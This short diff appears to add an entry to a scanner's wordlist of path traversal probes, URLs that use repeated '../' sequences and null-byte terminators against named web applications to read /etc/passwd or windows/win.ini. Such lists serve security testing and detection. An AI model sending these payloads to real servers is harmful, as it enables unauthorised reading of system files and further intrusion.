@@ -106,3 +106,4 @@
 /tiki-5.2/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini
 /index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00
 /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00
+/downlot.php?file=../../../../../../../../../../etc/passwd
